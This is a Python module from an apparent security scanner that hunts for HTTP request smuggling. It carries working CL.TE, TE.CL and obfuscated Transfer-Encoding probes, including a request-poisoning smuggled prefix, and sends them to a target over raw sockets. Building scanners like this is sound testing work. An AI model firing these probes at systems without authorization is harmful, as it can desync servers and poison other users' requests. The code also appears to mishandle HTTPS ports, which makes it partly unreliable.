"""
XLayer AI HTTP Request Smuggling Hunter
Detects CL.TE, TE.CL, and TE.TE variants using timing and differential responses.
This is one of the hardest bugs to detect — uses time-based differential analysis.
"""

import re
import time
import asyncio
from typing import List, Optional, Dict, Any
from loguru import logger

from xlayer_ai.core.vuln_hunters.base import BaseHunter, HunterResult
from xlayer_ai.models.target import AttackSurface, Endpoint
from xlayer_ai.models.vulnerability import (
    VulnHypothesis, VulnType, Confidence, VulnIndicator
)


# ─── CL.TE Timing Probe ───────────────────────────────────────────────────────
# Frontend uses Content-Length, backend uses Transfer-Encoding
# If vulnerable: backend waits for completion of 2nd chunked body → timeout

CLTE_TIMING_PROBE = (
    "POST {path} HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 6\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "X"  # extra byte — backend (chunked) waits for more
)

# ─── TE.CL Timing Probe ───────────────────────────────────────────────────────
# Frontend uses Transfer-Encoding, backend uses Content-Length
TECL_TIMING_PROBE = (
    "POST {path} HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "5e\r\n"
    "POST /404notfound HTTP/1.1\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 15\r\n"
    "\r\n"
    "x=1\r\n"
    "0\r\n"
    "\r\n"
)

# ─── TE.TE Obfuscation Variants ───────────────────────────────────────────────
TE_OBFUSCATION_HEADERS = [
    "Transfer-Encoding: xchunked",
    "Transfer-Encoding : chunked",
    "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
    "Transfer-Encoding:\x0bchunked",
    "Transfer-Encoding:\x09chunked",
    "X: X\r\nTransfer-Encoding: chunked",
    "Transfer-Encoding: chunked1",
    "GET / HTTP/1.1\r\nTransfer-Encoding: chunked",  # header injection
]

# ─── Differential Response Probe ──────────────────────────────────────────────
# Send CL.TE probe that poisons next request if vulnerable
CLTE_DIFFERENTIAL = (
    "POST {path} HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 49\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "e\r\n"
    "q=smuggling_test\r\n"
    "0\r\n"
    "\r\n"
    "GET /smuggled_path HTTP/1.1\r\n"
    "Foo: bar"
)


class HTTPSmugglingHunter(BaseHunter):
    """
    HTTP Request Smuggling Hunter.

    Detection strategy:
    1. CL.TE timing: send ambiguous request, measure if backend hangs
    2. TE.CL timing: alternative variant
    3. TE.TE: obfuscated Transfer-Encoding
    4. Differential: send smuggled prefix, check if next request is affected
    """

    name = "http_smuggling"
    vuln_types = [VulnType.HTTP_REQUEST_SMUGGLING]

    async def hunt(self, attack_surface: AttackSurface) -> HunterResult:
        start_time = time.time()
        self._reset_state()

        logger.info(f"HTTP Smuggling Hunter starting")

        base_url = attack_surface.base_url
        host, path = self._parse_url(base_url)

        # Only test the base endpoint — smuggling is a server-level bug
        fake_ep = self._make_fake_endpoint(base_url)

        await self._test_clte(fake_ep, host, path)
        await self._test_tecl(fake_ep, host, path)
        await self._test_te_obfuscation(fake_ep, host, path)

        duration = time.time() - start_time
        result = self._build_result(duration)
        logger.info(f"HTTP Smuggling Hunter complete: {result.findings_count} hypotheses")
        return result

    def _parse_url(self, url: str):
        """Extract host and path from URL."""
        match = re.match(r"https?://([^/]+)(.*)", url)
        if match:
            return match.group(1), match.group(2) or "/"
        return "target.com", "/"

    def _make_fake_endpoint(self, url: str):
        return type("Endpoint", (), {
            "url": url,
            "method": type("Method", (), {"value": "POST"})(),
            "parameters": [],
        })()

    async def _test_clte(self, endpoint, host: str, path: str):
        """Test CL.TE variant via timing."""
        self._endpoints_tested += 1
        self._payloads_sent += 1

        # Baseline timing
        baseline_ms = await self._measure_baseline(host, path)
        if baseline_ms is None:
            return

        # CL.TE timing probe (should hang if vulnerable)
        probe = CLTE_TIMING_PROBE.format(host=host, path=path)
        start = time.monotonic()
        try:
            await asyncio.wait_for(
                self._send_raw(host, probe),
                timeout=12
            )
            elapsed_ms = (time.monotonic() - start) * 1000
        except asyncio.TimeoutError:
            elapsed_ms = 12000  # timed out = strong signal

        if elapsed_ms > 8000 and elapsed_ms > baseline_ms * 3:
            h = self._create_hypothesis(
                vuln_type=VulnType.HTTP_REQUEST_SMUGGLING,
                endpoint=endpoint,
                parameter="(request_headers)",
                confidence=Confidence.HIGH,
                indicators=[
                    VulnIndicator(
                        indicator_type="clte_timing",
                        detail=(
                            f"CL.TE smuggling: request hung for {elapsed_ms:.0f}ms "
                            f"(baseline={baseline_ms:.0f}ms) — backend is chunked-aware"
                        ),
                        confidence_boost=0.4,
                    )
                ],
                suggested_payloads=[
                    "Content-Length: 6",
                    "Transfer-Encoding: chunked",
                    "",
                    "0",
                    "",
                    "X (smuggled prefix)",
                ],
                context={
                    "injection_type": "clte_smuggling",
                    "timing_ms": round(elapsed_ms),
                    "baseline_ms": round(baseline_ms),
                    "host": host,
                },
            )
            self._hypotheses.append(h)

    async def _test_tecl(self, endpoint, host: str, path: str):
        """Test TE.CL variant."""
        self._payloads_sent += 1
        baseline_ms = await self._measure_baseline(host, path)
        if baseline_ms is None:
            return

        probe = TECL_TIMING_PROBE.format(host=host, path=path)
        start = time.monotonic()
        try:
            await asyncio.wait_for(self._send_raw(host, probe), timeout=12)
            elapsed_ms = (time.monotonic() - start) * 1000
        except asyncio.TimeoutError:
            elapsed_ms = 12000

        if elapsed_ms > 8000 and elapsed_ms > baseline_ms * 3:
            h = self._create_hypothesis(
                vuln_type=VulnType.HTTP_REQUEST_SMUGGLING,
                endpoint=endpoint,
                parameter="(request_headers)",
                confidence=Confidence.HIGH,
                indicators=[
                    VulnIndicator(
                        indicator_type="tecl_timing",
                        detail=f"TE.CL smuggling: hung {elapsed_ms:.0f}ms (baseline={baseline_ms:.0f}ms)",
                        confidence_boost=0.4,
                    )
                ],
                suggested_payloads=[
                    "Transfer-Encoding: chunked",
                    "Content-Length: 4",
                ],
                context={
                    "injection_type": "tecl_smuggling",
                    "timing_ms": round(elapsed_ms),
                    "host": host,
                },
            )
            self._hypotheses.append(h)

    async def _test_te_obfuscation(self, endpoint, host: str, path: str):
        """Test TE.TE with obfuscated Transfer-Encoding headers."""
        for te_header in TE_OBFUSCATION_HEADERS[:3]:  # test first 3 variants
            self._payloads_sent += 1
            probe = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 4\r\n"
                f"{te_header}\r\n"
                f"\r\n"
                f"0\r\n"
                f"\r\n"
            )
            try:
                resp = await asyncio.wait_for(self._send_raw(host, probe), timeout=5)
                if resp and "400" not in resp[:50] and len(resp) > 50:
                    # Unexpected response to obfuscated TE → potential TE.TE
                    h = self._create_hypothesis(
                        vuln_type=VulnType.HTTP_REQUEST_SMUGGLING,
                        endpoint=endpoint,
                        parameter="Transfer-Encoding",
                        confidence=Confidence.MEDIUM,
                        indicators=[
                            VulnIndicator(
                                indicator_type="te_obfuscation",
                                detail=f"Server accepted obfuscated TE header: '{te_header[:50]}'",
                                confidence_boost=0.2,
                            )
                        ],
                        suggested_payloads=[te_header],
                        context={
                            "injection_type": "tete_smuggling",
                            "te_variant": te_header[:60],
                            "host": host,
                        },
                    )
                    self._hypotheses.append(h)
                    return
            except Exception:
                pass

    async def _measure_baseline(self, host: str, path: str) -> Optional[float]:
        """Measure normal request timing."""
        probe = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )
        start = time.monotonic()
        try:
            await asyncio.wait_for(self._send_raw(host, probe), timeout=10)
            return (time.monotonic() - start) * 1000
        except Exception:
            return None

    async def _send_raw(self, host: str, raw_request: str) -> Optional[str]:
        """Send raw HTTP request via TCP socket."""
        port = 443 if "https" in host else 80
        clean_host = host.split(":")[0]
        actual_port = int(host.split(":")[1]) if ":" in host else port

        try:
            if actual_port == 443 or port == 443:
                import ssl
                ctx = ssl.create_default_context()
                reader, writer = await asyncio.open_connection(
                    clean_host, actual_port, ssl=ctx
                )
            else:
                reader, writer = await asyncio.open_connection(clean_host, actual_port)

            writer.write(raw_request.encode("utf-8", errors="replace"))
            await writer.drain()

            response = await asyncio.wait_for(reader.read(4096), timeout=5)
            writer.close()
            return response.decode("utf-8", errors="replace")
        except Exception as e:
            logger.debug(f"Raw HTTP send failed: {e}")
            return None

    def _analyze_response(self, endpoint, parameter, payload, response):
        return None
